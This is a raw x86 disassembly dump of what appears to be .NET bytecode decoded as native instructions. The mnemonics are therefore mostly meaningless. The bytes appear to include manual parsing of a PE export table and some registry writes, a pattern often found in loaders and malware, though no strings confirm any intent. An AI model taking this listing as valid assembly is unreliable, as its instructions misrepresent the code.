  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	0b 07                	or     (%edi),%eax
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	9c                   	pushf
  4041b8:	00 00                	add    %al,(%eax)
  4041ba:	0a 6f a6             	or     -0x5a(%edi),%ch
  4041bd:	00 00                	add    %al,(%eax)
  4041bf:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4041c2:	28 00                	sub    %al,(%eax)
  4041c4:	00 00                	add    %al,(%eax)
  4041c6:	08 6f a7             	or     %ch,-0x59(%edi)
  4041c9:	00 00                	add    %al,(%eax)
  4041cb:	0a 74 81 00          	or     0x0(%ecx,%eax,4),%dh
  4041cf:	00 01                	add    %al,(%ecx)
  4041d1:	0d 06 09 72 df       	or     $0xdf720906,%eax
  4041d6:	1b 00                	sbb    (%eax),%eax
  4041d8:	70 6f                	jo     0x404249
  4041da:	d4 00                	aam    $0x0
  4041dc:	00 0a                	add    %cl,(%edx)
  4041de:	6f                   	outsl  %ds:(%esi),(%dx)
  4041df:	3d 00 00 0a 72       	cmp    $0x720a0000,%eax
  4041e4:	f7 1b                	negl   (%ebx)
  4041e6:	00 70 28             	add    %dh,0x28(%eax)
  4041e9:	7f 00                	jg     0x4041eb
  4041eb:	00 0a                	add    %cl,(%edx)
  4041ed:	0a 08                	or     (%eax),%cl
  4041ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f0:	a8 00                	test   $0x0,%al
  4041f2:	00 0a                	add    %cl,(%edx)
  4041f4:	2d d0 dd 0d 00       	sub    $0xdddd0,%eax
  4041f9:	00 00                	add    %al,(%eax)
  4041fb:	08 39                	or     %bh,(%ecx)
  4041fd:	06                   	push   %es
  4041fe:	00 00                	add    %al,(%eax)
  404200:	00 08                	add    %cl,(%eax)
  404202:	6f                   	outsl  %ds:(%esi),(%dx)
  404203:	27                   	daa
  404204:	00 00                	add    %al,(%eax)
  404206:	0a dc                	or     %ah,%bl
  404208:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  40420e:	39 06                	cmp    %eax,(%esi)
  404210:	00 00                	add    %al,(%eax)
  404212:	00 07                	add    %al,(%edi)
  404214:	6f                   	outsl  %ds:(%esi),(%dx)
  404215:	27                   	daa
  404216:	00 00                	add    %al,(%eax)
  404218:	0a dc                	or     %ah,%bl
  40421a:	06                   	push   %es
  40421b:	18 28                	sbb    %ch,(%eax)
  40421d:	4c                   	dec    %esp
  40421e:	00 00                	add    %al,(%eax)
  404220:	06                   	push   %es
  404221:	0a 06                	or     (%esi),%al
  404223:	28 d5                	sub    %dl,%ch
  404225:	00 00                	add    %al,(%eax)
  404227:	0a 39                	or     (%ecx),%bh
  404229:	0a 00                	or     (%eax),%al
  40422b:	00 00                	add    %al,(%eax)
  40422d:	72 fd                	jb     0x40422c
  40422f:	1b 00                	sbb    (%eax),%eax
  404231:	70 38                	jo     0x40426b
  404233:	01 00                	add    %eax,(%eax)
  404235:	00 00                	add    %al,(%eax)
  404237:	06                   	push   %es
  404238:	13 04 dd 0d 00 00 00 	adc    0xd(,%ebx,8),%eax
  40423f:	26 72 05             	es jb  0x404247
  404242:	1c 00                	sbb    $0x0,%al
  404244:	70 13                	jo     0x404259
  404246:	04 dd                	add    $0xdd,%al
  404248:	00 00                	add    %al,(%eax)
  40424a:	00 00                	add    %al,(%eax)
  40424c:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  40424f:	00 01                	add    %al,(%ecx)
  404251:	28 00                	sub    %al,(%eax)
  404253:	00 02                	add    %al,(%edx)
  404255:	00 31                	add    %dh,(%ecx)
  404257:	00 3a                	add    %bh,(%edx)
  404259:	6b 00 0d             	imul   $0xd,(%eax),%eax
  40425c:	00 00                	add    %al,(%eax)
  40425e:	00 00                	add    %al,(%eax)
  404260:	02 00                	add    (%eax),%al
  404262:	25 00 58 7d 00       	and    $0x7d5800,%eax
  404267:	0d 00 00 00 00       	or     $0x0,%eax
  40426c:	00 00                	add    %al,(%eax)
  40426e:	00 00                	add    %al,(%eax)
  404270:	af                   	scas   %es:(%edi),%eax
  404271:	af                   	scas   %es:(%edi),%eax
  404272:	00 0d 01 00 00 01    	add    %cl,0x1000001
  404278:	13 30                	adc    (%eax),%esi
  40427a:	02 00                	add    (%eax),%al
  40427c:	39 00                	cmp    %eax,(%eax)
  40427e:	00 00                	add    %al,(%eax)
  404280:	13 00                	adc    (%eax),%eax
  404282:	00 11                	add    %dl,(%ecx)
  404284:	28 d8                	sub    %bl,%al
  404286:	00 00                	add    %al,(%eax)
  404288:	0a 0a                	or     (%edx),%cl
  40428a:	16                   	push   %ss
  40428b:	0b 38                	or     (%eax),%edi
  40428d:	24 00                	and    $0x0,%al
  40428f:	00 00                	add    %al,(%eax)
  404291:	06                   	push   %es
  404292:	07                   	pop    %es
  404293:	a3 15 00 00 01       	mov    %eax,0x1000015
  404298:	0c 08                	or     $0x8,%al
  40429a:	6f                   	outsl  %ds:(%esi),(%dx)
  40429b:	d9 00                	flds   (%eax)
  40429d:	00 0a                	add    %cl,(%edx)
  40429f:	02 6f da             	add    -0x26(%edi),%ch
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	0a 28                	or     (%eax),%ch
  4042a6:	db 00                	fildl  (%eax)
  4042a8:	00 0a                	add    %cl,(%edx)
  4042aa:	39 02                	cmp    %eax,(%edx)
  4042ac:	00 00                	add    %al,(%eax)
  4042ae:	00 08                	add    %cl,(%eax)
  4042b0:	2a 07                	sub    (%edi),%al
  4042b2:	17                   	pop    %ss
  4042b3:	58                   	pop    %eax
  4042b4:	0b 07                	or     (%edi),%eax
  4042b6:	06                   	push   %es
  4042b7:	8e 69 32             	mov    0x32(%ecx),%gs
  4042ba:	d6                   	salc
  4042bb:	14 2a                	adc    $0x2a,%al
  4042bd:	00 00                	add    %al,(%eax)
  4042bf:	00 1b                	add    %bl,(%ebx)
  4042c1:	30 01                	xor    %al,(%ecx)
  4042c3:	00 17                	add    %dl,(%edi)
  4042c5:	00 00                	add    %al,(%eax)
  4042c7:	00 00                	add    %al,(%eax)
  4042c9:	00 00                	add    %al,(%eax)
  4042cb:	00 20                	add    %ah,(%eax)
  4042cd:	03 00                	add    (%eax),%eax
  4042cf:	00 80 28 4e 00 00    	add    %al,0x4e28(%eax)
  4042d5:	06                   	push   %es
  4042d6:	26 dd 06             	fldl   %es:(%esi)
  4042d9:	00 00                	add    %al,(%eax)
  4042db:	00 26                	add    %ah,(%esi)
  4042dd:	dd 00                	fldl   (%eax)
  4042df:	00 00                	add    %al,(%eax)
  4042e1:	00 2a                	add    %ch,(%edx)
  4042e3:	00 01                	add    %al,(%ecx)
  4042e5:	10 00                	adc    %al,(%eax)
  4042e7:	00 00                	add    %al,(%eax)
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	00 10                	add    %dl,(%eax)
  4042ed:	10 00                	adc    %al,(%eax)
  4042ef:	06                   	push   %es
  4042f0:	01 00                	add    %eax,(%eax)
  4042f2:	00 01                	add    %al,(%ecx)
  4042f4:	1b 30                	sbb    (%eax),%esi
  4042f6:	03 00                	add    (%eax),%eax
  4042f8:	40                   	inc    %eax
  4042f9:	00 00                	add    %al,(%eax)
  4042fb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4042fe:	00 11                	add    %dl,(%ecx)
  404300:	20 00                	and    %al,(%eax)
  404302:	01 00                	add    %eax,(%eax)
  404304:	00 73 dc             	add    %dh,-0x24(%ebx)
  404307:	00 00                	add    %al,(%eax)
  404309:	0a 0a                	or     (%edx),%cl
  40430b:	28 6a 00             	sub    %ch,0x0(%edx)
  40430e:	00 06                	add    %al,(%esi)
  404310:	06                   	push   %es
  404311:	20 00                	and    %al,(%eax)
  404313:	01 00                	add    %eax,(%eax)
  404315:	00 28                	add    %ch,(%eax)
  404317:	6b 00 00             	imul   $0x0,(%eax),%eax
  40431a:	06                   	push   %es
  40431b:	16                   	push   %ss
  40431c:	3e 0c 00             	ds or  $0x0,%al
  40431f:	00 00                	add    %al,(%eax)
  404321:	06                   	push   %es
  404322:	6f                   	outsl  %ds:(%esi),(%dx)
  404323:	3d 00 00 0a 0b       	cmp    $0xb0a0000,%eax
  404328:	dd 11                	fstl   (%ecx)
  40432a:	00 00                	add    %al,(%eax)
  40432c:	00 dd                	add    %bl,%ch
  40432e:	06                   	push   %es
  40432f:	00 00                	add    %al,(%eax)
  404331:	00 26                	add    %ah,(%esi)
  404333:	dd 00                	fldl   (%eax)
  404335:	00 00                	add    %al,(%eax)
  404337:	00 72 59             	add    %dh,0x59(%edx)
  40433a:	14 00                	adc    $0x0,%al
  40433c:	70 2a                	jo     0x404368
  40433e:	07                   	pop    %es
  40433f:	2a 01                	sub    (%ecx),%al
  404341:	10 00                	adc    %al,(%eax)
  404343:	00 00                	add    %al,(%eax)
  404345:	00 00                	add    %al,(%eax)
  404347:	00 32                	add    %dh,(%edx)
  404349:	32 00                	xor    (%eax),%al
  40434b:	06                   	push   %es
  40434c:	01 00                	add    %eax,(%eax)
  40434e:	00 01                	add    %al,(%ecx)
  404350:	1b 30                	sbb    (%eax),%esi
  404352:	03 00                	add    (%eax),%eax
  404354:	9f                   	lahf
  404355:	00 00                	add    %al,(%eax)
  404357:	00 15 00 00 11 7e    	add    %dl,0x7e110000
  40435d:	7d 00                	jge    0x40435f
  40435f:	00 0a                	add    %cl,(%edx)
  404361:	72 15                	jb     0x404378
  404363:	1c 00                	sbb    $0x0,%al
  404365:	70 6f                	jo     0x4043d6
  404367:	dd 00                	fldl   (%eax)
  404369:	00 0a                	add    %cl,(%edx)
  40436b:	0a 06                	or     (%esi),%al
  40436d:	72 2d                	jb     0x40439c
  40436f:	1c 00                	sbb    $0x0,%al
  404371:	70 6f                	jo     0x4043e2
  404373:	de 00                	fiadds (%eax)
  404375:	00 0a                	add    %cl,(%edx)
  404377:	39 0b                	cmp    %ecx,(%ebx)
  404379:	00 00                	add    %al,(%eax)
  40437b:	00 06                	add    %al,(%esi)
  40437d:	72 2d                	jb     0x4043ac
  40437f:	1c 00                	sbb    $0x0,%al
  404381:	70 6f                	jo     0x4043f2
  404383:	df 00                	filds  (%eax)
  404385:	00 0a                	add    %cl,(%edx)
  404387:	06                   	push   %es
  404388:	6f                   	outsl  %ds:(%esi),(%dx)
  404389:	e0 00                	loopne 0x40438b
  40438b:	00 0a                	add    %cl,(%edx)
  40438d:	dd 06                	fldl   (%esi)
  40438f:	00 00                	add    %al,(%eax)
  404391:	00 26                	add    %ah,(%esi)
  404393:	dd 00                	fldl   (%eax)
  404395:	00 00                	add    %al,(%eax)
  404397:	00 00                	add    %al,(%eax)
  404399:	7e 7d                	jle    0x404418
  40439b:	00 00                	add    %al,(%eax)
  40439d:	0a 72 3b             	or     0x3b(%edx),%dh
  4043a0:	1c 00                	sbb    $0x0,%al
  4043a2:	70 17                	jo     0x4043bb
  4043a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a5:	e1 00                	loope  0x4043a7
  4043a7:	00 0a                	add    %cl,(%edx)
  4043a9:	72 4d                	jb     0x4043f8
  4043ab:	1c 00                	sbb    $0x0,%al
  4043ad:	70 17                	jo     0x4043c6
  4043af:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b0:	e1 00                	loope  0x4043b2
  4043b2:	00 0a                	add    %cl,(%edx)
  4043b4:	72 5d                	jb     0x404413
  4043b6:	1c 00                	sbb    $0x0,%al
  4043b8:	70 6f                	jo     0x404429
  4043ba:	e2 00                	loop   0x4043bc
  4043bc:	00 0a                	add    %cl,(%edx)
  4043be:	dd 06                	fldl   (%esi)
  4043c0:	00 00                	add    %al,(%eax)
  4043c2:	00 26                	add    %ah,(%esi)
  4043c4:	dd 00                	fldl   (%eax)
  4043c6:	00 00                	add    %al,(%eax)
  4043c8:	00 00                	add    %al,(%eax)
  4043ca:	7e 7d                	jle    0x404449
  4043cc:	00 00                	add    %al,(%eax)
  4043ce:	0a 72 3b             	or     0x3b(%edx),%dh
  4043d1:	1c 00                	sbb    $0x0,%al
  4043d3:	70 17                	jo     0x4043ec
  4043d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043d6:	e1 00                	loope  0x4043d8
  4043d8:	00 0a                	add    %cl,(%edx)
  4043da:	72 4d                	jb     0x404429
  4043dc:	1c 00                	sbb    $0x0,%al
  4043de:	70 17                	jo     0x4043f7
  4043e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4043e1:	e1 00                	loope  0x4043e3
  4043e3:	00 0a                	add    %cl,(%edx)
  4043e5:	72 6d                	jb     0x404454
  4043e7:	1c 00                	sbb    $0x0,%al
  4043e9:	70 6f                	jo     0x40445a
  4043eb:	e2 00                	loop   0x4043ed
  4043ed:	00 0a                	add    %cl,(%edx)
  4043ef:	dd 06                	fldl   (%esi)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 26                	add    %ah,(%esi)
  4043f5:	dd 00                	fldl   (%eax)
  4043f7:	00 00                	add    %al,(%eax)
  4043f9:	00 2a                	add    %ch,(%edx)
  4043fb:	00 01                	add    %al,(%ecx)
  4043fd:	28 00                	sub    %al,(%eax)
  4043ff:	00 00                	add    %al,(%eax)
  404401:	00 00                	add    %al,(%eax)
  404403:	00 36                	add    %dh,(%esi)
  404405:	36 00 06             	add    %al,%ss:(%esi)
  404408:	01 00                	add    %eax,(%eax)
  40440a:	00 01                	add    %al,(%ecx)
  40440c:	00 00                	add    %al,(%eax)
  40440e:	3d 00 2a 67 00       	cmp    $0x672a00,%eax
  404413:	06                   	push   %es
  404414:	01 00                	add    %eax,(%eax)
  404416:	00 01                	add    %al,(%ecx)
  404418:	00 00                	add    %al,(%eax)
  40441a:	6e                   	outsb  %ds:(%esi),(%dx)
  40441b:	00 2a                	add    %ch,(%edx)
  40441d:	98                   	cwtl
  40441e:	00 06                	add    %al,(%esi)
  404420:	01 00                	add    %eax,(%eax)
  404422:	00 01                	add    %al,(%ecx)
  404424:	1b 30                	sbb    (%eax),%esi
  404426:	03 00                	add    (%eax),%eax
  404428:	68 00 00 00 16       	push   $0x16000000
  40442d:	00 00                	add    %al,(%eax)
  40442f:	11 28                	adc    %ebp,(%eax)
  404431:	6d                   	insl   (%dx),%es:(%edi)
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 6f e5             	or     -0x1b(%edi),%ch
  404437:	00 00                	add    %al,(%eax)
  404439:	0a 6f e6             	or     -0x1a(%edi),%ch
  40443c:	00 00                	add    %al,(%eax)
  40443e:	0a 0a                	or     (%edx),%cl
  404440:	38 2a                	cmp    %ch,(%edx)
  404442:	00 00                	add    %al,(%eax)
  404444:	00 06                	add    %al,(%esi)
  404446:	6f                   	outsl  %ds:(%esi),(%dx)
  404447:	01 00                	add    %eax,(%eax)
  404449:	00 0a                	add    %cl,(%edx)
  40444b:	74 1b                	je     0x404468
  40444d:	00 00                	add    %al,(%eax)
  40444f:	01 0b                	add    %ecx,(%ebx)
  404451:	07                   	pop    %es
  404452:	6f                   	outsl  %ds:(%esi),(%dx)
  404453:	e7 00                	out    %eax,$0x0
  404455:	00 0a                	add    %cl,(%edx)
  404457:	02 17                	add    (%edi),%dl
  404459:	28 e8                	sub    %ch,%al
  40445b:	00 00                	add    %al,(%eax)
  40445d:	0a 3a                	or     (%edx),%bh
  40445f:	0c 00                	or     $0x0,%al
  404461:	00 00                	add    %al,(%eax)
  404463:	07                   	pop    %es
  404464:	6f                   	outsl  %ds:(%esi),(%dx)
  404465:	e9 00 00 0a 0c       	jmp    0xc4a446a
  40446a:	dd 27                	frstor (%edi)
  40446c:	00 00                	add    %al,(%eax)
  40446e:	00 06                	add    %al,(%esi)
  404470:	6f                   	outsl  %ds:(%esi),(%dx)
  404471:	02 00                	add    (%eax),%al
  404473:	00 0a                	add    %cl,(%edx)
  404475:	2d ce dd 14 00       	sub    $0x14ddce,%eax
  40447a:	00 00                	add    %al,(%eax)
  40447c:	06                   	push   %es
  40447d:	75 40                	jne    0x4044bf
  40447f:	00 00                	add    %al,(%eax)
  404481:	01 0d 09 39 06 00    	add    %ecx,0x63909
  404487:	00 00                	add    %al,(%eax)
  404489:	09 6f 27             	or     %ebp,0x27(%edi)
  40448c:	00 00                	add    %al,(%eax)
  40448e:	0a dc                	or     %ah,%bl
  404490:	7e ad                	jle    0x40443f
  404492:	00 00                	add    %al,(%eax)
  404494:	0a 2a                	or     (%edx),%ch
  404496:	08 2a                	or     %ch,(%edx)
  404498:	01 10                	add    %edx,(%eax)
  40449a:	00 00                	add    %al,(%eax)
  40449c:	02 00                	add    (%eax),%al
  40449e:	10 00                	adc    %al,(%eax)
  4044a0:	3c 4c                	cmp    $0x4c,%al
  4044a2:	00 14 00             	add    %dl,(%eax,%eax,1)
  4044a5:	00 00                	add    %al,(%eax)
  4044a7:	00 1b                	add    %bl,(%ebx)
  4044a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4044ac:	f5                   	cmc
  4044ad:	01 00                	add    %eax,(%eax)
  4044af:	00 17                	add    %dl,(%edi)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	11 7e ad             	adc    %edi,-0x53(%esi)
  4044b6:	00 00                	add    %al,(%eax)
  4044b8:	0a 0a                	or     (%edx),%cl
  4044ba:	0f 00 28             	verw   (%eax)
  4044bd:	ea 00 00 0a 1f 3c 6a 	ljmp   $0x6a3c,$0x1f0a0000
  4044c4:	58                   	pop    %eax
  4044c5:	28 eb                	sub    %ch,%bl
  4044c7:	00 00                	add    %al,(%eax)
  4044c9:	0a 28                	or     (%eax),%ch
  4044cb:	ec                   	in     (%dx),%al
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	0a 0b                	or     (%ebx),%cl
  4044d0:	0f 00 28             	verw   (%eax)
  4044d3:	ea 00 00 0a 07 6a 58 	ljmp   $0x586a,$0x70a0000
  4044da:	1f                   	pop    %ds
  4044db:	14 6a                	adc    $0x6a,%al
  4044dd:	58                   	pop    %eax
  4044de:	28 eb                	sub    %ch,%bl
  4044e0:	00 00                	add    %al,(%eax)
  4044e2:	0a 28                	or     (%eax),%ch
  4044e4:	ed                   	in     (%dx),%eax
  4044e5:	00 00                	add    %al,(%eax)
  4044e7:	0a 26                	or     (%esi),%ah
  4044e9:	0f 00 28             	verw   (%eax)
  4044ec:	ea 00 00 0a 07 6a 58 	ljmp   $0x586a,$0x70a0000
  4044f3:	1f                   	pop    %ds
  4044f4:	18 6a 58             	sbb    %ch,0x58(%edx)
  4044f7:	0c 08                	or     $0x8,%al
  4044f9:	28 eb                	sub    %ch,%bl
  4044fb:	00 00                	add    %al,(%eax)
  4044fd:	0a 28                	or     (%eax),%ch
  4044ff:	ed                   	in     (%dx),%eax
  404500:	00 00                	add    %al,(%eax)
  404502:	0a 16                	or     (%esi),%dl
  404504:	6a 0d                	push   $0xd
  404506:	20 0b                	and    %cl,(%ebx)
  404508:	01 00                	add    %eax,(%eax)
  40450a:	00 40 0b             	add    %al,0xb(%eax)
  40450d:	00 00                	add    %al,(%eax)
  40450f:	00 08                	add    %cl,(%eax)
  404511:	1f                   	pop    %ds
  404512:	60                   	pusha
  404513:	6a 58                	push   $0x58
  404515:	0d 38 06 00 00       	or     $0x638,%eax
  40451a:	00 08                	add    %cl,(%eax)
  40451c:	1f                   	pop    %ds
  40451d:	70 6a                	jo     0x404589
  40451f:	58                   	pop    %eax
  404520:	0d 09 28 eb 00       	or     $0xeb2809,%eax
  404525:	00 0a                	add    %cl,(%edx)
  404527:	28 ec                	sub    %ch,%ah
  404529:	00 00                	add    %al,(%eax)
  40452b:	0a 13                	or     (%ebx),%dl
  40452d:	04 0f                	add    $0xf,%al
  40452f:	00 28                	add    %ch,(%eax)
  404531:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  404538:	58                   	pop    %eax
  404539:	1f                   	pop    %ds
  40453a:	10 6a 58             	adc    %ch,0x58(%edx)
  40453d:	28 eb                	sub    %ch,%bl
  40453f:	00 00                	add    %al,(%eax)
  404541:	0a 28                	or     (%eax),%ch
  404543:	ec                   	in     (%dx),%al
  404544:	00 00                	add    %al,(%eax)
  404546:	0a 13                	or     (%ebx),%dl
  404548:	05 0f 00 28 ea       	add    $0xea28000f,%eax
  40454d:	00 00                	add    %al,(%eax)
  40454f:	0a 11                	or     (%ecx),%dl
  404551:	04 6a                	add    $0x6a,%al
  404553:	58                   	pop    %eax
  404554:	1f                   	pop    %ds
  404555:	14 6a                	adc    $0x6a,%al
  404557:	58                   	pop    %eax
  404558:	28 eb                	sub    %ch,%bl
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 28                	or     (%eax),%ch
  40455e:	ec                   	in     (%dx),%al
  40455f:	00 00                	add    %al,(%eax)
  404561:	0a 26                	or     (%esi),%ah
  404563:	0f 00 28             	verw   (%eax)
  404566:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  40456d:	58                   	pop    %eax
  40456e:	1f                   	pop    %ds
  40456f:	18 6a 58             	sbb    %ch,0x58(%edx)
  404572:	28 eb                	sub    %ch,%bl
  404574:	00 00                	add    %al,(%eax)
  404576:	0a 28                	or     (%eax),%ch
  404578:	ec                   	in     (%dx),%al
  404579:	00 00                	add    %al,(%eax)
  40457b:	0a 13                	or     (%ebx),%dl
  40457d:	06                   	push   %es
  40457e:	0f 00 28             	verw   (%eax)
  404581:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  404588:	58                   	pop    %eax
  404589:	1f                   	pop    %ds
  40458a:	1c 6a                	sbb    $0x6a,%al
  40458c:	58                   	pop    %eax
  40458d:	28 eb                	sub    %ch,%bl
  40458f:	00 00                	add    %al,(%eax)
  404591:	0a 28                	or     (%eax),%ch
  404593:	ec                   	in     (%dx),%al
  404594:	00 00                	add    %al,(%eax)
  404596:	0a 13                	or     (%ebx),%dl
  404598:	07                   	pop    %es
  404599:	0f 00 28             	verw   (%eax)
  40459c:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  4045a3:	58                   	pop    %eax
  4045a4:	1f                   	pop    %ds
  4045a5:	20 6a 58             	and    %ch,0x58(%edx)
  4045a8:	28 eb                	sub    %ch,%bl
  4045aa:	00 00                	add    %al,(%eax)
  4045ac:	0a 28                	or     (%eax),%ch
  4045ae:	ec                   	in     (%dx),%al
  4045af:	00 00                	add    %al,(%eax)
  4045b1:	0a 13                	or     (%ebx),%dl
  4045b3:	08 0f                	or     %cl,(%edi)
  4045b5:	00 28                	add    %ch,(%eax)
  4045b7:	ea 00 00 0a 11 04 6a 	ljmp   $0x6a04,$0x110a0000
  4045be:	58                   	pop    %eax
  4045bf:	1f                   	pop    %ds
  4045c0:	24 6a                	and    $0x6a,%al
  4045c2:	58                   	pop    %eax
  4045c3:	28 eb                	sub    %ch,%bl
  4045c5:	00 00                	add    %al,(%eax)
  4045c7:	0a 28                	or     (%eax),%ch
  4045c9:	ec                   	in     (%dx),%al
  4045ca:	00 00                	add    %al,(%eax)
  4045cc:	0a 13                	or     (%ebx),%dl
  4045ce:	09 16                	or     %edx,(%esi)
  4045d0:	13 0a                	adc    (%edx),%ecx
  4045d2:	38 95 00 00 00 0f    	cmp    %dl,0xf000000(%ebp)
  4045d8:	00 28                	add    %ch,(%eax)
  4045da:	ea 00 00 0a 0f 00 28 	ljmp   $0x2800,$0xf0a0000
  4045e1:	ea 00 00 0a 11 08 6a 	ljmp   $0x6a08,$0x110a0000
  4045e8:	58                   	pop    %eax
  4045e9:	11 0a                	adc    %ecx,(%edx)
  4045eb:	1a 5a 6a             	sbb    0x6a(%edx),%bl
  4045ee:	58                   	pop    %eax
  4045ef:	28 eb                	sub    %ch,%bl
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	0a 28                	or     (%eax),%ch
  4045f5:	ec                   	in     (%dx),%al
  4045f6:	00 00                	add    %al,(%eax)
  4045f8:	0a 6a 58             	or     0x58(%edx),%ch
  4045fb:	28 eb                	sub    %ch,%bl
  4045fd:	00 00                	add    %al,(%eax)
  4045ff:	0a 28                	or     (%eax),%ch
  404601:	ee                   	out    %al,(%dx)
  404602:	00 00                	add    %al,(%eax)
  404604:	0a 03                	or     (%ebx),%al
  404606:	1b 6f ef             	sbb    -0x11(%edi),%ebp
  404609:	00 00                	add    %al,(%eax)
  40460b:	0a 39                	or     (%ecx),%bh
  40460d:	55                   	push   %ebp
  40460e:	00 00                	add    %al,(%eax)
  404610:	00 0f                	add    %cl,(%edi)
  404612:	00 28                	add    %ch,(%eax)
  404614:	ea 00 00 0a 11 09 6a 	ljmp   $0x6a09,$0x110a0000
  40461b:	58                   	pop    %eax
  40461c:	11 0a                	adc    %ecx,(%edx)
  40461e:	18 5a 6a             	sbb    %bl,0x6a(%edx)
  404621:	58                   	pop    %eax
  404622:	28 eb                	sub    %ch,%bl
  404624:	00 00                	add    %al,(%eax)
  404626:	0a 28                	or     (%eax),%ch
  404628:	ed                   	in     (%dx),%eax
  404629:	00 00                	add    %al,(%eax)
  40462b:	0a 11                	or     (%ecx),%dl
  40462d:	05 58 13 0b 0f       	add    $0xf0b1358,%eax
  404632:	00 28                	add    %ch,(%eax)
  404634:	ea 00 00 0a 11 07 6a 	ljmp   $0x6a07,$0x110a0000
  40463b:	58                   	pop    %eax
  40463c:	1a 11                	sbb    (%ecx),%dl
  40463e:	0b 11                	or     (%ecx),%edx
  404640:	05 59 5a 6a 58       	add    $0x586a5a59,%eax
  404645:	28 eb                	sub    %ch,%bl
  404647:	00 00                	add    %al,(%eax)
  404649:	0a 28                	or     (%eax),%ch
  40464b:	ec                   	in     (%dx),%al
  40464c:	00 00                	add    %al,(%eax)
  40464e:	0a 13                	or     (%ebx),%dl
  404650:	0c 02                	or     $0x2,%al
  404652:	28 f0                	sub    %dh,%al
  404654:	00 00                	add    %al,(%eax)
  404656:	0a 11                	or     (%ecx),%dl
  404658:	0c 6a                	or     $0x6a,%al
  40465a:	58                   	pop    %eax
  40465b:	28 eb                	sub    %ch,%bl
  40465d:	00 00                	add    %al,(%eax)
  40465f:	0a 0a                	or     (%edx),%cl
  404661:	38 0f                	cmp    %cl,(%edi)
  404663:	00 00                	add    %al,(%eax)
  404665:	00 11                	add    %dl,(%ecx)
  404667:	0a 17                	or     (%edi),%dl
  404669:	58                   	pop    %eax
  40466a:	13 0a                	adc    (%edx),%ecx
  40466c:	11 0a                	adc    %ecx,(%edx)
  40466e:	11 06                	adc    %eax,(%esi)
  404670:	3f                   	aas
  404671:	62 ff ff             	(bad) {rz-bad},{%k7}{z}
  404674:	ff                   	lcall  (bad)
  404675:	dd 0c 00             	fisttpll (%eax,%eax,1)
  404678:	00 00                	add    %al,(%eax)
  40467a:	26 72 cb             	es jb  0x404648
  40467d:	1c 00                	sbb    $0x0,%al
  40467f:	70 73                	jo     0x4046f4
  404681:	f1                   	int1
  404682:	00 00                	add    %al,(%eax)
  404684:	0a 7a 06             	or     0x6(%edx),%bh
  404687:	7e ad                	jle    0x404636
  404689:	00 00                	add    %al,(%eax)
  40468b:	0a 28                	or     (%eax),%ch
  40468d:	e3 00                	jecxz  0x40468f
  40468f:	00 0a                	add    %cl,(%edx)
  404691:	39 11                	cmp    %edx,(%ecx)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 03                	add    %al,(%ebx)
  404697:	72 0b                	jb     0x4046a4
  404699:	1d 00 70 28 86       	sbb    $0x86287000,%eax
  40469e:	00 00                	add    %al,(%eax)
  4046a0:	0a 73 f2             	or     -0xe(%ebx),%dh
  4046a3:	00 00                	add    %al,(%eax)
  4046a5:	0a 7a 06             	or     0x6(%edx),%bh
  4046a8:	2a 00                	sub    (%eax),%al
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	41                   	inc    %ecx
  4046ad:	1c 00                	sbb    $0x0,%al
  4046af:	00 00                	add    %al,(%eax)
  4046b1:	00 00                	add    %al,(%eax)
  4046b3:	00 06                	add    %al,(%esi)
  4046b5:	00 00                	add    %al,(%eax)
  4046b7:	00 c0                	add    %al,%al
  4046b9:	01 00                	add    %eax,(%eax)
  4046bb:	00 c6                	add    %al,%dh
  4046bd:	01 00                	add    %eax,(%eax)
  4046bf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	01 00                	add    %eax,(%eax)
  4046c6:	00 01                	add    %al,(%ecx)
  4046c8:	13 30                	adc    (%eax),%esi
  4046ca:	04 00                	add    $0x0,%al
  4046cc:	78 00                	js     0x4046ce
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	18 00                	sbb    %al,(%eax)
  4046d2:	00 11                	add    %dl,(%ecx)
  4046d4:	0e                   	push   %cs
  4046d5:	04 16                	add    $0x16,%al
  4046d7:	54                   	push   %esp
  4046d8:	1b 8d 01 00 00 01    	sbb    0x1000001(%ebp),%ecx
  4046de:	25 16 02 8c 88       	and    $0x888c0216,%eax
  4046e3:	00 00                	add    %al,(%eax)
  4046e5:	01 a2 25 17 03 71    	add    %esp,0x71031725(%edx)
  4046eb:	88 00                	mov    %al,(%eax)
  4046ed:	00 01                	add    %al,(%ecx)
  4046ef:	8c 88 00 00 01 a2    	mov    %cs,-0x5dff0000(%eax)
  4046f5:	25 18 04 71 88       	and    $0x88710418,%eax
  4046fa:	00 00                	add    %al,(%eax)
  4046fc:	01 8c 88 00 00 01 a2 	add    %ecx,-0x5dff0000(%eax,%ecx,4)
  404703:	25 19 05 8c 85       	and    $0x858c0519,%eax
  404708:	00 00                	add    %al,(%eax)
  40470a:	01 a2 25 1a 0e 04    	add    %esp,0x40e1a25(%edx)
  404710:	4b                   	dec    %ebx
  404711:	8c 85 00 00 01 a2    	mov    %es,-0x5dff0000(%ebp)
  404717:	0a 72 89             	or     -0x77(%edx),%dh
